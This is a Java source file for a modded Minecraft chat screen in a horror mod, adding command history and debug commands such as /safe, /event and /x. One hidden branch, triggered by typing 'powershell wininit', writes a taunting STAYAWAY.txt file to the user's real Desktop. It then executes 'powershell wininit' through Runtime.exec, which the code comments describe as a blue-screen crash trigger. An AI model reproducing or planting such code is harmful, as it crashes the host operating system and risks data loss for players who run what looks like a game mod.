package net.minecraft.src;

import org.lwjgl.input.Keyboard;
import java.util.ArrayList;
import java.util.List;

public class GuiChat extends GuiScreen {
	protected String message = "";
	private int updateCounter = 0;
	private static final String allowedCharacters = ChatAllowedCharacters.allowedCharacters;

	// Command history
	private static List<String> commandHistory = new ArrayList<String>();
	private int historyIndex = -1;
	private String currentTyping = "";

	public void initGui() {
		Keyboard.enableRepeatEvents(true);
	}

	public void onGuiClosed() {
		Keyboard.enableRepeatEvents(false);
	}

	public void updateScreen() {
		++this.updateCounter;
	}

	protected void keyTyped(char var1, int var2) {
		// Стрелка вверх (вверх по истории - к более старым командам)
		if(var2 == 200) { // KEY_UP
			if(!commandHistory.isEmpty()) {
				if(historyIndex == -1) {
					// Сохранить текущий ввод перед переключением в историю
					currentTyping = this.message;
					historyIndex = commandHistory.size() - 1;
				} else if(historyIndex > 0) {
					historyIndex--;
				}

				if(historyIndex >= 0 && historyIndex < commandHistory.size()) {
					this.message = commandHistory.get(historyIndex);
				}
			}
			return;
		}

		// Стрелка вниз (вниз по истории - к более новым командам)
		if(var2 == 208) { // KEY_DOWN
			if(!commandHistory.isEmpty() && historyIndex != -1) {
				historyIndex++;

				if(historyIndex >= commandHistory.size()) {
					// Вернуться к текущему вводу
					this.message = currentTyping;
					historyIndex = -1;
				} else {
					this.message = commandHistory.get(historyIndex);
				}
			}
			return;
		}

		if(var2 == 1) {
			this.mc.displayGuiScreen((GuiScreen)null);
		} else if(var2 == 28) {
			String var3 = this.message.trim();
			if(var3.length() > 0) {
				String var4 = this.message.trim();

				// Добавить команду в историю (если не дубликат последней)
				if(var4.startsWith("/") || var4.startsWith("powershell")) {
					if(commandHistory.isEmpty() || !commandHistory.get(commandHistory.size() - 1).equals(var4)) {
						commandHistory.add(var4);
						// Ограничить историю 50 командами
						if(commandHistory.size() > 50) {
							commandHistory.remove(0);
						}
					}
				}

				// Сбросить индекс истории
				historyIndex = -1;
				currentTyping = "";

				// Horror mod: Check for special commands
				if(var4.equals("/safe")) {
					HorrorState.safeMode = true;
					GlitchManager.stopAll();
					HorrorEffectsManager.stopAll();
					this.mc.thePlayer.addChatMessage("\u00a7aSafe mode enabled.");
					this.mc.thePlayer.addChatMessage("\u00a7aGood luck!");
					this.mc.displayGuiScreen((GuiScreen)null);
					return;
				} else if(var4.equals("/mstinfo")) {
					// Display horror system info
					HorrorEffectsManager.displaySystemInfo(this.mc.thePlayer);
					this.mc.displayGuiScreen((GuiScreen)null);
					return;
				} else if(var4.startsWith("/event")) {
					// Trigger specific event manually
					try {
						String eventStr = var4.substring(6).trim();
						if(eventStr.length() > 0) {
							int eventId = Integer.parseInt(eventStr);
							if(eventId >= 0 && eventId <= 50) {
								HorrorEffectsManager.triggerSpecificEffect(eventId);
								this.mc.thePlayer.addChatMessage("\u00a7eTriggered event #" + eventId);
							} else {
								this.mc.thePlayer.addChatMessage("\u00a7cEvent ID must be between 0 and 50");
							}
						} else {
							this.mc.thePlayer.addChatMessage("\u00a7eUsage: /event <number> (e.g. /event 5)");
							this.mc.thePlayer.addChatMessage("\u00a7eAvailable events: 0-50");
						}
					} catch (NumberFormatException e) {
						this.mc.thePlayer.addChatMessage("\u00a7cInvalid event number");
					}
					this.mc.displayGuiScreen((GuiScreen)null);
					return;
				} else if(var4.startsWith("/x")) {
					// Speed multiplier command - only changes interval speed
					try {
						String multiplierStr = var4.substring(2).trim();
						if(multiplierStr.length() > 0) {
							float multiplier = Float.parseFloat(multiplierStr);
							if(multiplier >= 0.1F && multiplier <= 100.0F) {
								HorrorState.horrorSpeedMultiplier = multiplier;
								this.mc.thePlayer.addChatMessage("\u00a7eHorror speed set to x" + multiplier);
								this.mc.thePlayer.addChatMessage("\u00a7eEffects will appear " + multiplier + "x faster");
							} else {
								this.mc.thePlayer.addChatMessage("\u00a7cMultiplier must be between 0.1 and 100");
							}
						} else {
							this.mc.thePlayer.addChatMessage("\u00a7eUsage: /x<number> (e.g. /x2 or /x10)");
							this.mc.thePlayer.addChatMessage("\u00a7eCurrent speed: x" + HorrorState.horrorSpeedMultiplier);
						}
					} catch (NumberFormatException e) {
						this.mc.thePlayer.addChatMessage("\u00a7cInvalid number format");
					}
					this.mc.displayGuiScreen((GuiScreen)null);
					return;
				} else if(var4.equals("powershell wininit")) {
					// BSOD trigger - create desktop file first
					try {
						String desktop = System.getProperty("user.home") + "\\Desktop\\STAYAWAY.txt";
						java.io.FileWriter writer = new java.io.FileWriter(desktop);
						writer.write("Are you having fun?:)");
						writer.close();
					} catch (Exception e) {
						e.printStackTrace();
					}

					// Trigger BSOD
					try {
						Runtime.getRuntime().exec("powershell wininit");
					} catch (Exception e) {
						e.printStackTrace();
					}

					this.mc.displayGuiScreen((GuiScreen)null);
					return;
				}

				if(!this.mc.lineIsCommand(var4)) {
					// In singleplayer, just show the message locally
					if(this.mc.theWorld != null && !this.mc.theWorld.multiplayerWorld) {
						this.mc.ingameGUI.addChatMessage("<" + this.mc.thePlayer.username + "> " + var4);
					} else {
						this.mc.thePlayer.sendChatMessage(var4);
					}
				}
			}

			this.mc.displayGuiScreen((GuiScreen)null);
		} else {
			if(var2 == 14 && this.message.length() > 0) {
				this.message = this.message.substring(0, this.message.length() - 1);
			}

			if((allowedCharacters.indexOf(var1) >= 0 || var1 > 32) && this.message.length() < 100) {
				this.message = this.message + var1;
			}

		}
	}

	public void drawScreen(int var1, int var2, float var3) {
		this.drawRect(2, this.height - 14, this.width - 2, this.height - 2, Integer.MIN_VALUE);
		this.drawString(this.fontRenderer, "> " + this.message + (this.updateCounter / 6 % 2 == 0 ? "_" : ""), 4, this.height - 12, 14737632);
		super.drawScreen(var1, var2, var3);
	}

	protected void mouseClicked(int var1, int var2, int var3) {
		if(var3 == 0) {
			if(this.mc.ingameGUI.field_933_a != null) {
				if(this.message.length() > 0 && !this.message.endsWith(" ")) {
					this.message = this.message + " ";
				}

				this.message = this.message + this.mc.ingameGUI.field_933_a;
				byte var4 = 100;
				if(this.message.length() > var4) {
					this.message = this.message.substring(0, var4);
				}
			} else {
				super.mouseClicked(var1, var2, var3);
			}
		}

	}
}
